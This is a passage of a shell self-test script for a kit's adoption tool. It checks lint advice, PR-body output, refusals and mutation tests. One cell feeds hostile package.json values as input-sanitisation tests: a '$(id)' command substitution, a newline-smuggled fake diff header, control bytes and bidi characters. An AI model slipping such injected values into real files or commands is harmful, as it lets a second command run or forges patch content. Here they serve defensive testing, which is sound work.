      mkdir -p "$TGT/profiles/p/scaffold/test"; printf 'x\n' > "$TGT/profiles/p/scaffold/test/a.test.ts"
      printf '%s\n' profiles/p/scaffold/test/a.test.ts >> "$TGT/.kit-manifest"
    fi
  fi
  commit_all "$TGT" copy-in
}
lint_want() {  # run C's shape on the full fixture: the seven lines of design 6.5 in the patch form (the terminal form is the same without the leading "# ")
  printf '#   Lint and test commands that read the whole tree (they now read the kit\047s files too; this patch does not change package.json):\n'
  printf '#     scripts.test: xo has no path, so it reads every file under the root\n'
  printf '#     scripts.test: node --test has no file, so it runs every test file under the root\n'
  printf '#   Folders that hold only the kit\047s files: conformance profiles scripts skills\n'
  printf '#   To keep the kit\047s folders out, for example:\n'
  printf '#     xo: in package.json, add "xo": {"ignores": ["conformance/**", "profiles/**", ...]} with each folder above\n'
  printf '#     node --test: name your own test files or folders, for example node --test "test/**/*.test.js"\n'
}
lint_blk() { awk -v h="$2" 'index($0, h) == 1 { f = 1 } f { print; if (++n == 7) exit }' "$1"; }   # <file> <header prefix>: the seven lines from the lint header on
lint_run() {  # <kit> <label> <package.json text> <shape> [flags...]: the fixture, then a full run
  _lk=$1; _ll=$2; mk_lint "$3" "$4"; shift 4
  arun "$_lk" "$TGT" --out "$P" $FULLF "$@"
  rc_is 0 "$_ll: the verb exits 0"
}

cell_a19() {  # run C's shape, a copy-in without --brownfield: exactly the block of design 6.5, in the patch NOTES and in the terminal report
  lint_run "$1" "A19" '{"scripts":{"test":"xo && node --test"}}' full
  [ "$RC" -eq 0 ] || return 0
  pre_diff "$P" > "$W/a19.sum"; printf '%s\n' "$OUT" > "$W/a19.term"
  lint_want > "$W/a19.want"; lint_want | sed 's/^# //' > "$W/a19.wantt"
  lint_blk "$W/a19.sum" "#   Lint and test commands" > "$W/a19.got"
  lint_blk "$W/a19.term" "  Lint and test commands" > "$W/a19.gott"
  if cmp -s "$W/a19.want" "$W/a19.got"; then chk 0 "A19 the patch NOTES carry exactly the lint block, in design order"; else chk 1 "A19 the patch NOTES carry exactly the lint block, in design order"; fi
  if cmp -s "$W/a19.wantt" "$W/a19.gott"; then chk 0 "A19 the terminal report carries the same lines without the hash"; else chk 1 "A19 the terminal report carries the same lines without the hash"; fi
  _hn=$(grep -c 'Lint and test commands that read the whole tree' "$W/a19.sum" || true)
  if [ "$_hn" = 1 ]; then chk 0 "A19 the lint block's header appears once in the patch summary"; else chk 1 "A19 the lint block's header appears once in the patch summary (saw $_hn)"; fi
}

a20_leg_uncommitted() {  # <kit>: an uncommitted change to package.json is refused by the dirty check on the files the fitted CI reads (SWAS-1009's R8): rc 2, its message, no patch written
  mk_lint '{"scripts":{"test":"xo && node --test"}}' full
  printf '{"scripts":{"test":"xo && node --test","extra":"y"}}\n' > "$TGT/package.json"
  arun "$1" "$TGT" --out "$P" $FULLF
  refused "A20 an uncommitted package.json" "a file the fitted CI reads has an uncommitted change"
}
cell_a20() {  # package.json is never edited: no hunk, byte-identical after the apply, the target untouched by the run
  mk_lint '{"scripts":{"test":"xo && node --test"}}' full
  cp "$TGT/package.json" "$W/a20.pkg"; snap "$TGT" > "$W/a20.before"
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "A20 the verb exits 0"
  if [ "$RC" -eq 0 ]; then
    snap "$TGT" > "$W/a20.after"
    if cmp -s "$W/a20.before" "$W/a20.after"; then chk 0 "A20 the run leaves the target byte-for-byte unchanged"; else chk 1 "A20 the run leaves the target byte-for-byte unchanged"; fi
    if patch_has_path "$P" package.json; then chk 1 "A20 the patch has no package.json hunk"; else chk 0 "A20 the patch has no package.json hunk"; fi
    if g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1; then chk 0 "A20 git apply takes the patch"; else chk 1 "A20 git apply takes the patch"; fi
    if cmp -s "$W/a20.pkg" "$TGT/package.json"; then chk 0 "A20 package.json is byte-identical after the apply"; else chk 1 "A20 package.json is byte-identical after the apply"; fi
  fi
  a20_leg_uncommitted "$1"
}

a21_none() {  # <kit> <label> <package.json text> <shape> [flags...]: no lint block at all, in the terminal or the patch
  _nk=$1; _nl=$2; _np=$3; _ns=$4; shift 4
  lint_run "$_nk" "A21 $_nl" "$_np" "$_ns" "$@"
  hasnt "Lint and test commands" "A21 $_nl: no lint block in the terminal report"
  hasnt "[lint] " "A21 $_nl: no lint line of any kind"
  file_lacks "$P" "Lint and test commands" "A21 $_nl: no lint block in the patch"
}
a21_bf() {  # <kit>: the brownfield-shaped copy-in names no test file a runner finds, so xo is found and node --test is not (F4)
  lint_run "$1" "A21 brownfield-shaped" '{"scripts":{"test":"xo && node --test"}}' bf
  has "scripts.test: xo has no path, so it reads every file under the root" "A21 brownfield-shaped: the xo finding is printed"
  hasnt "node --test has no file" "A21 brownfield-shaped: no node --test finding"
  hasnt "node --test: name your own test files" "A21 brownfield-shaped: no node --test hint"
  file_lacks "$P" "node --test has no file" "A21 brownfield-shaped: no node --test finding in the patch"
  a21_none "$1" "vitest on a brownfield-shaped copy-in" '{"scripts":{"test":"vitest"}}' bf
}
cell_a21() {  # no false advice
  a21_bf "$1"
  a21_none "$1" "run C's own fix" '{"scripts":{"test":"xo index.js && node --test test.js"}}' full
  a21_none "$1" "eslint src" '{"scripts":{"lint":"eslint src"}}' full
  a21_none "$1" "mocha" '{"scripts":{"test":"mocha"}}' full
  a21_none "$1" "node index.js" '{"scripts":{"test":"node index.js"}}' full
  a21_none "$1" "no package.json" "" nopkg --stack typescript-node
  a21_none "$1" "no .kit-manifest" '{"scripts":{"test":"xo && node --test"}}' nomanifest
}

a22_case() {  # <kit> <label> <package.json text> <finding line> [<hint line>]
  lint_run "$1" "A22 $2" "$3" full
  has "$4" "A22 $2: the finding line"
  if [ -n "${5:-}" ]; then has "$5" "A22 $2: the hint line"; fi
}
cell_a22() {  # rule A (the whole-tree operand) and the npx skip
  a22_case "$1" "biome check ." '{"scripts":{"lint":"biome check ."}}' 'scripts.lint: biome is given ".", which covers the whole tree' 'biome: point it at your own folders, or add each folder above to its ignore list'
  _pj=$(jq -nc --arg v "vitest run '**/*.test.ts'" '{scripts: {"test:unit": $v}}')
  a22_case "$1" "a quoted glob on vitest" "$_pj" 'scripts.test:unit: vitest is given "**/*.test.ts", which covers the whole tree'
  a22_case "$1" "npx --yes eslint" '{"scripts":{"test":"npx --yes eslint"}}' 'scripts.test: eslint has no path, so it reads every file under the root' 'eslint: add {ignores: ['
  a22_cap "$1"
}
a22_cap() {  # <kit>: 25 whole-tree keys print exactly 20 finding lines and one "... and 5 more" line
  _pj=$(jq -nc '{scripts: ([range(25) | {key: "test:k\(.)", value: "biome ."}] | from_entries)}')
  lint_run "$1" "A22 25 whole-tree keys" "$_pj" full
  [ "$RC" -eq 0 ] || return 0
  pre_diff "$P" > "$W/a22.sum"
  _cn=$(grep -c 'covers the whole tree' "$W/a22.sum" || true)
  if [ "$_cn" = 20 ]; then chk 0 "A22 the patch summary prints exactly 20 finding lines"; else chk 1 "A22 the patch summary prints exactly 20 finding lines (saw $_cn)"; fi
  _cn=$(grep -cxF '#   ... and 5 more' "$W/a22.sum" || true)
  if [ "$_cn" = 1 ]; then chk 0 "A22 the patch summary has one '... and 5 more' line"; else chk 1 "A22 the patch summary has one '... and 5 more' line (saw $_cn)"; fi
  has "  ... and 5 more" "A22 the terminal report has the '... and 5 more' line"
}

cell_a23() {  # the folder list drops a folder that holds a tracked file of the adopter's
  mk_lint '{"scripts":{"test":"xo && node --test"}}' full
  printf 'echo mine\n' > "$TGT/scripts/build.sh"; commit_all "$TGT" own-script
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "A23 the verb exits 0"
  pre_diff "$P" > "$W/a23.sum"
  file_has "$W/a23.sum" "Folders that hold only the kit's files: conformance profiles skills" "A23 scripts is left out of the folder line; conformance, profiles and skills stay"
  file_lacks "$W/a23.sum" "profiles scripts" "A23 no folder line lists scripts"
  a23_steer "$1"
}
a23_steer() {  # <kit>: a .kit-manifest naming src/x.js (src holds an adopter file, is no kit folder), ../y and ghost/z (no adopter file, no kit folder) steers the folder line nowhere
  mk_lint '{"scripts":{"test":"xo && node --test"}}' full
  mkdir -p "$TGT/src"; printf 'console.log(2);\n' > "$TGT/src/app.js"
  printf '%s\n' src/x.js ../y ghost/z >> "$TGT/.kit-manifest"; commit_all "$TGT" steer
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "A23 a manifest that names the adopter's own folder: the verb exits 0"
  pre_diff "$P" > "$W/a23.sum"
  _fl=$(grep -F "Folders that hold only the kit's files:" "$W/a23.sum" || true)
  if [ "$_fl" = "#   Folders that hold only the kit's files: conformance profiles scripts skills" ]; then chk 0 "A23 neither src, .., nor ghost is named in the folder line"; else chk 1 "A23 neither src, .., nor ghost is named in the folder line (got: $_fl)"; fi
}

a24_safe() {  # the summary after a hostile package.json: no diff-like line, no control byte, the patch still applies
  pre_diff "$P" > "$W/a24.sum"
  if sed 's/^# \{0,1\}//' "$W/a24.sum" | grep -q '^diff '; then chk 1 "A24 no summary line starts with diff after its hash"; else chk 0 "A24 no summary line starts with diff after its hash"; fi
  if [ -z "$(LC_ALL=C tr -d '\011\012\040-\176\200-\377' < "$W/a24.sum")" ]; then chk 0 "A24 the summary holds no control byte"; else chk 1 "A24 the summary holds no control byte"; fi
  file_lacks "$W/a24.sum" 'a/x b/x' "A24 the hostile value never reaches the summary"
  file_lacks "$W/a24.sum" '$(id)' "A24 the hostile tool name never reaches the summary"
  if g -C "$TGT" apply --whitespace=nowarn --check "$P" >/dev/null 2>&1; then chk 0 "A24 git apply --check takes the patch"; else chk 1 "A24 git apply --check takes the patch"; fi
}
cell_a24() {  # hostile values: a key with a control byte, a value with a newline then a diff header, a rule-A tool of $(id)
  lint_run "$1" "A24" '{"scripts":{"test:\u0001x":"xo","lint:b":"echo\ndiff --git a/x b/x","test:c":"$(id) ."}}' full
  [ "$RC" -eq 0 ] || return 0
  has 'scripts.<a script>: xo has no path, so it reads every file under the root' "A24 a key with a control byte prints as <a script>"
  has 'scripts.test:c: this command is given ".", which covers the whole tree' "A24 a tool name that fails its charset prints as this command"
  hasnt "diff --git a/x b/x" "A24 the terminal report never holds the hostile value"
  a24_safe
  a24_charset "$1"
}
a24_charset() {  # <kit>: a bidi character and a backtick in a key, a tool and an operand, and a value past 2000 characters: each falls back to its fixed words and no raw byte reaches the output
  _bd=$(printf '\342\200\256'); _bt='`'
  _big=$(awk 'BEGIN { for (i = 0; i < 2100; i++) printf "a" }')
  _pj=$(jq -nc --arg k "test:${_bd}${_bt}x" --arg o "biome ./**${_bd}${_bt}y" --arg b "biome ./**$_big" --arg t "bi${_bd}${_bt}ome ." \
    '{scripts: {($k): "biome .", "test:e": $o, "test:f": $b, "test:g": $t}}')
  lint_run "$1" "A24 charset" "$_pj" full
  [ "$RC" -eq 0 ] || return 0
  has 'scripts.<a script>: biome is given ".", which covers the whole tree' "A24 charset: a key with a bidi character and a backtick prints as <a script>"
  has 'scripts.test:e: biome is given "a whole-tree glob", which covers the whole tree' "A24 charset: an operand with a bidi character and a backtick prints as a whole-tree glob"
  has 'scripts.test:f: biome is given "a whole-tree glob", which covers the whole tree' "A24 charset: a 2000-character operand prints as a whole-tree glob"
  has 'scripts.test:g: this command is given ".", which covers the whole tree' "A24 charset: a tool with a bidi character and a backtick prints as this command"
  pre_diff "$P" > "$W/a24.sum"
  file_lacks "$W/a24.sum" "$_bd" "A24 charset: no bidi byte in the summary"
  file_lacks "$W/a24.sum" "$_bt" "A24 charset: no backtick in the summary"
  hasnt "$_bd" "A24 charset: no bidi byte in the terminal report"
  hasnt "$_bt" "A24 charset: no backtick in the terminal report"
}

a25_guard_only() {  # <kit>: under --guard-only the terminal prints the block and the patch bytes are today's (no summary, no lint line)
  mk_lint '{"scripts":{"test":"xo && node --test"}}' full
  arun "$1" "$TGT" --out "$P" --guard-only
  rc_is 0 "A25 --guard-only: the verb exits 0"
  has "scripts.test: xo has no path, so it reads every file under the root" "A25 --guard-only: the terminal prints the xo finding"
  has "scripts.test: node --test has no file, so it runs every test file under the root" "A25 --guard-only: the terminal prints the node --test finding"
  file_lacks "$P" "Lint and test commands" "A25 --guard-only: the patch holds no lint block"
  cp "$P" "$W/a25.g1"
  mk_js '{"scripts":{"test":"xo && node --test"}}'; arun "$1" "$TGT" --out "$P" --guard-only
  if cmp -s "$W/a25.g1" "$P"; then chk 0 "A25 --guard-only: the patch bytes equal those of a target with no copy-in"; else chk 1 "A25 --guard-only: the patch bytes equal those of a target with no copy-in"; fi
}
a25_adopted() {  # <kit>: an already-adopted target: the terminal prints the block and no file is written
  mk_lint '{"scripts":{"test":"xo && node --test"}}' full
  do_apply "A25 the first run" "$1" $FULLF || return 0
  commit_all "$TGT" adopted; P="$OUTD/second.patch"
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "A25 the already-adopted run exits 0"
  has "already adopted: nothing to patch" "A25 the already-adopted run says nothing is left to patch"
  has "scripts.test: xo has no path, so it reads every file under the root" "A25 the already-adopted run prints the lint block"
  absent "$P" "A25 the already-adopted run writes no file"
  absent "$P.pr.md" "A25 the already-adopted run writes no PR body"
}
cell_a25() { a25_guard_only "$1"; a25_adopted "$1"; }

cell_a26() {  # a package.json that is not strict JSON: one line, no finding, the rest of the patch composed
  lint_run "$1" "A26" '{"scripts":{"test":"xo"},"scripts":{"test":"y"}}' full
  [ "$RC" -eq 0 ] || return 0
  pre_diff "$P" > "$W/a26.sum"
  _ln=$(grep -cF '[lint] not read: package.json is not strict JSON' "$W/a26.sum" || true)
  if [ "$_ln" = 1 ]; then chk 0 "A26 the summary has the one [lint] not-read line"; else chk 1 "A26 the summary has the one [lint] not-read line (saw $_ln)"; fi
  hasnt "Lint and test commands" "A26 no lint block in the terminal report"
  file_lacks "$W/a26.sum" "xo has no path" "A26 no finding in the summary"
  if patch_has_path "$P" REQUIRED-CHECKS.md; then chk 0 "A26 the rest of the patch is still composed"; else chk 1 "A26 the rest of the patch is still composed"; fi
}

# --- cells AD1-AD5 and B1-B2 (SWAS-1010 PR 4, errata Q2 and R2-N6): the PR body written beside the patch, and what it says ---
cell_ad1() {  # a full run writes two files, the patch and <patch>.pr.md: both mode 600, both outside the target, the target unchanged, the report names the body
  mk_js; snap "$TGT" > "$W/ad1.before"
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "AD1 the verb exits 0"
  [ "$RC" -eq 0 ] || return 0
  exists "$P" "AD1 the patch is written"
  exists "$P.pr.md" "AD1 the PR body is written beside the patch"
  if [ "$(ls -A "$OUTD" | wc -l | tr -d ' ')" = 2 ]; then chk 0 "AD1 exactly two files exist at --out"; else chk 1 "AD1 exactly two files exist at --out"; fi
  for _af in "$P" "$P.pr.md"; do
    if [ "$(ls -ld "$_af" 2>/dev/null | cut -c1-10)" = "-rw-------" ]; then chk 0 "AD1 $(basename "$_af") is mode 600"; else chk 1 "AD1 $(basename "$_af") is mode 600"; fi
    case "$_af/" in "$TGT"/*) chk 1 "AD1 $(basename "$_af") is outside the target" ;; *) chk 0 "AD1 $(basename "$_af") is outside the target" ;; esac
  done
  snap "$TGT" > "$W/ad1.after"
  if cmp -s "$W/ad1.before" "$W/ad1.after"; then chk 0 "AD1 the target is byte-for-byte unchanged"; else chk 1 "AD1 the target is byte-for-byte unchanged"; fi
  has "/p.patch.pr.md" "AD1 the report's next steps name the PR body"
}
cell_ad2() {  # an existing <patch>.pr.md refuses (exit 2), the file is left as it was, and no patch is written
  mk_js; printf 'EXAMPLE_VALUE\n' > "$P.pr.md"
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 2 "AD2 an existing .pr.md exits 2"
  has "already exists" "AD2 an existing .pr.md names its cause"
  absent "$P" "AD2 an existing .pr.md wrote no patch"
  if [ "$(cat "$P.pr.md" 2>/dev/null)" = "EXAMPLE_VALUE" ]; then chk 0 "AD2 an existing .pr.md is left as it was"; else chk 1 "AD2 an existing .pr.md is left as it was"; fi
}
cell_ad3() {  # a refusal leaves no .pr.md: a usage refusal (exit 2) and a self-check refusal (exit 1)
  mk_repo; arun "$1" "$TGT" --out "$P"
  refused "AD3 a usage refusal" "--guard-only"
  SEQ=$((SEQ + 1)); _fk="$W/f$SEQ"; cp -Rp "$1" "$_fk"
  apply_sed "AD3 fault the matcher dropped" "$_fk" '/# FAULT-KIT$/s/matcher: \$m, //' || return 0
  mk_repo; arun "$_fk" "$TGT" --out "$P" --guard-only
  rc_is 1 "AD3 a self-check refusal exits 1"
  absent "$P" "AD3 a self-check refusal wrote no patch"
  absent "$P.pr.md" "AD3 a self-check refusal wrote no PR body"
}
cell_ad4() {  # a symlink at <patch>.pr.md counts as present: refused, nothing written, nothing written through the link
  mk_js; ln -s "$W/ext$SEQ.pr" "$P.pr.md"
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 2 "AD4 a symlinked .pr.md exits 2"
  has "already exists" "AD4 a symlinked .pr.md names its cause"
  absent "$P" "AD4 a symlinked .pr.md wrote no patch"
  absent "$W/ext$SEQ.pr" "AD4 nothing was written through the link"
}
cell_ad5() {  # a body write failure removes the patch and exits 1
  SEQ=$((SEQ + 1)); _fk="$W/f$SEQ"; cp -Rp "$1" "$_fk"
  apply_sed "AD5 fault the body cannot be written" "$_fk" '/# FAULT-BODYWRITE$/s,exec 3> "\$PRB",exec 3> "$PRB/x",' || return 0
  mk_js; arun "$_fk" "$TGT" --out "$P" $FULLF
  rc_is 1 "AD5 a body write failure exits 1"
  has "the patch was removed" "AD5 a body write failure says the patch was removed"
  absent "$P" "AD5 a body write failure removes the patch"
  absent "$P.pr.md" "AD5 a body write failure leaves no PR body"
}
cell_ad6() {  # a TERM between the patch and the body leaves neither file (the fault sends the signal from inside the body write)
  SEQ=$((SEQ + 1)); _fk="$W/f$SEQ"; cp -Rp "$1" "$_fk"
  apply_sed "AD6 fault a TERM during the body write" "$_fk" '/# FAULT-BODYWRITE$/s,exec 3> "\$PRB",kill -TERM $$; exec 3> "$PRB",' || return 0
  mk_js; arun "$_fk" "$TGT" --out "$P" $FULLF
  rc_is 143 "AD6 a TERM during the body write exits 143"
  absent "$P" "AD6 a TERM during the body write leaves no patch"
  absent "$P.pr.md" "AD6 a TERM during the body write leaves no PR body"
}
cell_b3() {  # a target that keeps its own ci.yml: the body still gives the dispositions rule, and never calls that file stamped
  mk_js; mkdir -p "$TGT/.github/workflows"; printf 'name: EXAMPLE adopter ci\n' > "$TGT/.github/workflows/ci.yml"; commit_all "$TGT" own
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "B3 the verb exits 0"
  [ "$RC" -eq 0 ] || return 0
  file_has "$P.pr.md" "conformance/gate-dispositions.txt" "B3 the body still gives the dispositions rule"
  file_lacks "$P.pr.md" "stamped" "B3 the body does not call the adopter's own ci.yml stamped"
}
B_CHECKS="control-plane-ratification backlog-presence loop-state ceremony-binding review-lane tracker-board-gates solo-go-bound ci"   # the design's section 3 table
cell_b1() {  # the body names every check of the table, the three hand-merge steps and the dispositions rule
  mk_js; arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "B1 the verb exits 0"
  [ "$RC" -eq 0 ] || return 0
  for _bc in $B_CHECKS; do file_has "$P.pr.md" "\`$_bc\`" "B1 the body names $_bc"; done
  file_has "$P.pr.md" "MERGE_RELATIONSHIP=solo" "B1 hand-merge step 1: the dial file"
  file_has "$P.pr.md" "promotion-verify.sh record" "B1 hand-merge step 2: record your GO"
  file_has "$P.pr.md" "Merge this PR yourself, by hand" "B1 hand-merge step 3: merge it by hand"
  file_has "$P.pr.md" "conformance/gate-dispositions.txt" "B1 the body names the dispositions file"
  file_has "$P.pr.md" "\`na\` line" "B1 the body states the dispositions rule"
}
cell_b2() {  # the body lists only the checks whose workflow file the applied tree holds
  mk_js; arun "$1" "$TGT" --out "$P" $FULLF --ci gitlab
  rc_is 0 "B2 --ci gitlab: the verb exits 0"
  if [ "$RC" -eq 0 ]; then
    for _bc in $B_CHECKS; do file_lacks "$P.pr.md" "\`$_bc\`" "B2 --ci gitlab: the body does not name $_bc"; done
    file_lacks "$P.pr.md" "conformance/gate-dispositions.txt" "B2 --ci gitlab: no dispositions rule without a ci.yml"
    file_has "$P.pr.md" "adds no CI workflow" "B2 --ci gitlab: the body says no kit check is added"
  fi
  mk_js; arun "$1" "$TGT" --out "$P" --guard-only
  rc_is 0 "B2 --guard-only: the verb exits 0"
  if [ "$RC" -eq 0 ]; then
    for _bc in $B_CHECKS; do file_lacks "$P.pr.md" "\`$_bc\`" "B2 --guard-only: the body does not name $_bc"; done
  fi
}

apply_sed() {  # <label> <kit dir> <sed script>: the script is applied to the kit's adopt.sh; rc 1 (and a red) when it matched nothing or the result does not parse
  printf '%s\n' "$3" > "$W/mut.sed"
  sed -f "$W/mut.sed" "$2/scripts/adopt.sh" > "$2/scripts/adopt.sh.mut"
  if cmp -s "$2/scripts/adopt.sh" "$2/scripts/adopt.sh.mut"; then chk 1 "$1 applied (the sed script matched nothing)"; rm -f "$2/scripts/adopt.sh.mut"; return 1; fi
  cat "$2/scripts/adopt.sh.mut" > "$2/scripts/adopt.sh"; rm -f "$2/scripts/adopt.sh.mut"
  if ! sh -n "$2/scripts/adopt.sh" 2>/dev/null; then chk 1 "$1 parses (a mutant that cannot run would read as killed)"; return 1; fi
  return 0
}
mutant() {  # <label> <sed script> <cell>...: every named cell must go red on the mutated verb
  _ml=$1; _msd=$2; shift 2
  mk_kit; _mk=$KITDIR
  apply_sed "mutant $_ml" "$_mk" "$_msd" || { rm -rf "$_mk"; return 0; }
  for _mc in "$@"; do
    _sv=$SELFTEST_BAD; SELFTEST_BAD=0; SELFTEST_QUIET=1
    "$_mc" "$_mk"
    rm -rf "$W"/t[0-9]* "$W"/o[0-9]* "$W"/f[0-9]* "$W"/ext* "$W"/plain*
    _red=$SELFTEST_BAD; SELFTEST_BAD=$_sv; SELFTEST_QUIET=0
    if [ "$_red" -gt 0 ]; then chk 0 "mutant $_ml reds ${_mc#cell_}"; else chk 1 "mutant $_ml survived ${_mc#cell_} (the cell did not red)"; fi
  done
  rm -rf "$_mk"
}

selftest() {
  { [ -f "$ROOT/conformance/guard-wired.sh" ] && [ -f "$ROOT/docs/adoption/brownfield.md" ] && [ -f "$ROOT/conformance/agents-brief.sh" ] && [ -f "$TPL" ]; } || { echo "FAIL: $ROOT lacks conformance/guard-wired.sh, conformance/agents-brief.sh, templates/PROJECT-CLAUDE-TEMPLATE.md or docs/adoption/brownfield.md; adopt --selftest cannot build its fixture kit"; return 1; }
  jq_ok 2>/dev/null || { echo "FAIL: adopt --selftest needs jq 1.7 or later"; return 1; }
  unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE
  W=$(mktemp -d) || { echo "FAIL: no temp dir"; return 1; }
  trap 'rm -rf "$W"' EXIT
  trap 'rm -rf "$W"; exit 129' HUP
  trap 'rm -rf "$W"; exit 130' INT
  trap 'rm -rf "$W"; exit 143' TERM
  mkdir -p "$W/home" "$W/stubs"
  for _s in gh curl; do printf '#!/bin/sh\necho called >> "%s/stub.log"\nexit 1\n' "$W" > "$W/stubs/$_s"; chmod +x "$W/stubs/$_s"; done
  KMATCH='Bash|Write|Edit|NotebookEdit|mcp__.*|Read'
  KIT0="$W/kit0"; mkdir -p "$KIT0/scripts" "$KIT0/conformance" "$KIT0/docs/adoption" "$KIT0/.claude/hooks" "$KIT0/templates" "$KIT0/adapters/example-a" "$KIT0/adapters/example-b"
  cp "$ROOT/scripts/adopt.sh" "$KIT0/scripts/adopt.sh"
  cp "$ROOT/conformance/guard-wired.sh" "$KIT0/conformance/guard-wired.sh"
  cp "$ROOT/conformance/agents-brief.sh" "$KIT0/conformance/agents-brief.sh"
  cp "$TPL" "$KIT0/templates/PROJECT-CLAUDE-TEMPLATE.md"
  printf '{"contextFile": "CLAUDE.md"}\n' > "$KIT0/adapters/example-a/adapter.json"   # synthetic manifests: the two context files the verb stamps
  printf '{"contextFile": "AGENTS.md"}\n' > "$KIT0/adapters/example-b/adapter.json"
  cp "$ROOT/docs/adoption/brownfield.md" "$KIT0/docs/adoption/brownfield.md"
  printf '#!/bin/sh\n# EXAMPLE_VALUE kit guard\nexit 0\n' > "$KIT0/.claude/hooks/guard.sh"
  printf '#!/bin/sh\n# EXAMPLE_VALUE kit guard core\nexit 0\n' > "$KIT0/.claude/hooks/guard-core.sh"
  CANON=$(extract_canon "$KIT0/conformance/guard-wired.sh") || { echo "FAIL: GW_CANON could not be read from conformance/guard-wired.sh"; return 1; }
  mk_kit_settings "$KIT0/.claude/settings.json"
  mk_stamp_fixture
  for _c in cell_a9 cell_a10 cell_a11 cell_a12 cell_a13 cell_a14 cell_a16 cell_a17 cell_a18 cell_a19 cell_a20 cell_a21 cell_a22 cell_a23 cell_a24 cell_a25 cell_a26 cell_ad1 cell_ad2 cell_ad3 cell_ad4 cell_ad5 cell_ad6 cell_b1 cell_b2 cell_b3; do   # A18 runs A1-A8 under --guard-only
    mk_kit; "$_c" "$KITDIR"
    rm -rf "$KITDIR" "$W"/t[0-9]* "$W"/o[0-9]* "$W"/f[0-9]* "$W"/ext* "$W"/plain*
  done
  ARUN_EXTRA="--guard-only"   # the standing mutants of A1-A8 judge the guard patch
  mutant "write-claude-directly" '/# MUT-WRITEDIRECT$/s/.*/  mkdir -p "$TROOT\/.claude"; cp -Rp "$T\/chk\/.claude\/." "$TROOT\/.claude\/"/' cell_a1
  mutant "drop-an-adopter-key" '/# MUT-DROPKEY$/s/\.permissions\.deny = /del(.model) | .permissions.deny = /' cell_a2
  mutant "re-match-the-shared-element" '/# MUT-REMATCH$/s/elif \$el.matcher == \$m then .out += [[]\$el |/elif true then .out += [$el | .matcher = $m |/' cell_a2
  mutant "no-idempotence" '/# MUT-NOIDEM$/s/.*/sem_equal() { return 1; }   # MUT-NOIDEM/' cell_a3
  mutant "skip-the-strict-gate" '/# MUT-NOGATE$/s/.*/  :/' cell_a4g
  mutant "substring-guard-match" '/# MUT-SUBSTR$/s/^GUARD_RE=.*# MUT-SUBSTR$/GUARD_RE=guard.sh   # MUT-SUBSTR/' cell_a4s
  mutant "unanchored-guard-match" '/# MUT-SUBSTR$/s/\\A[[][[]:space:]]\*(/[[:space:]]*(/
/# MUT-SUBSTR$/s/[[][[]:space:]]\*\\z/[[:space:]]*/' cell_a4s
  mutant "skip-the-self-check" '/# MUT-NOCHECK$/s/.*/  :/' cell_a5
  mutant "ignore-a-warn" '/# MUT-IGNWARN$/s/\^WARN:/^NO-SUCH-LINE:/' cell_a5
  mutant "skip-the-deny-assertion" '/# MUT-NODENY$/s/.*/  :/' cell_a5
  mutant "drop-the-region-byte-check" '/# MUT-REGBYTES$/s/.*/  :/' cell_a7
  mutant "insert-below-instead-of-above" '/# MUT-INSBELOW$/s|.*|  _ins=$(( $(grep -c "" "$1") + 1 ))   # MUT-INSBELOW|' cell_a7
  mutant "grade-all-of-agents-brief-as-passing" '/# MUT-ECFAIL$/s/(FAIL|UNVERIFIED)/NO-SUCH/' cell_a7
  mutant "skip-the-as-is-lock" '/# MUT-ASISLOCK$/s/.*/  :/' cell_a7
  ARUN_EXTRA=""
  selftest_mutants_1009
  selftest_mutants_1011
  selftest_mutants_1010
  if [ "$SELFTEST_BAD" -eq 0 ]; then echo "adopt --selftest: OK"; return 0; fi
  echo "adopt --selftest: FAIL ($SELFTEST_BAD)" >&2; return 1
}
selftest_mutants_1009() {  # the standing mutants of the brownfield areas (SWAS-1009); each must red the cells it names
  mutant "run-the-branch-protection-leg-on-a-tracker" '/# MUT-BPSKIP$/s/\[ -n "\$R_TBG" \]/[ -z "$A_R" ]/' cell_a10
  mutant "no-summary" '/# MUT-SUMMARY$/s/.*/  : > "$T\/sum"   # MUT-SUMMARY/' cell_a9
  mutant "summary-line-loses-its-hash" '/# MUT-SUMLEAD$/s/printf "# \[%s\] %s\\n"/printf "[%s] %s\\n"/' cell_a9
  mutant "secret-scan-not-moved" '/# MUT-SCANFIRST$/s/ "\$T\/fit\/blk\.\$N_SC"//;/# MUT-SCANFIRST$/s/ && \[ "\$_i" -ne "\$N_SC" \]//' cell_a11
  mutant "npm-ci-whatever-the-lockfile" '/# MUT-ALWAYSCI$/s/.*/  return 0   # MUT-ALWAYSCI/' cell_a11
  mutant "every-npm-run-step-kept" '/# MUT-ALLSCRIPTS$/s/.*/has_script() { return 0; }   # MUT-ALLSCRIPTS/' cell_a11
  mutant "dropped-id-written-as-apply" '/# MUT-NODISP$/s/_dk=\$2/_dk=apply/' cell_a11
  mutant "secret-scan-written-na" '/# MUT-SECRETNA$/s/gate-secret-scan apply/gate-secret-scan na/' cell_a11
  mutant "proposed-row-put-in-the-register" '/# MUT-FILLWAIVER$/s,; fi   # MUT-FILLWAIVER,; printf "| board-governance | x |\\n" >> WAIVER-REGISTER.md; fi,' cell_a10 cell_a12
  mutant "area-c-clobbers-an-existing-ci" '/# MUT-CLOBBER$/s/\[ -e "\$T\/base\/.github\/workflows\/ci.yml" \]/[ -z "$A_R" ]/' cell_a13
  mutant "fitter-rewrites-a-kit-file" '/# MUT-TOUCHKIT$/s,; fi   # MUT-TOUCHKIT,; mkdir -p scripts; printf "x\\n" >> scripts/adopt.sh; fi,' cell_a14
  mutant "workflow-copied-with-a-byte-changed" '/# MUT-WFBYTE$/s,; done   # MUT-WFBYTE,; printf "x" >> .github/workflows/ratification.yml; done,' cell_a10
  mutant "upload-and-provenance-kept-without-a-build" '/# MUT-KEEPUPLOAD$/s/DROP_PROV=1/DROP_PROV=0/;/# MUT-KEEPUPLOAD$/s/drop_blk "\$N_UP"/:/' cell_a11
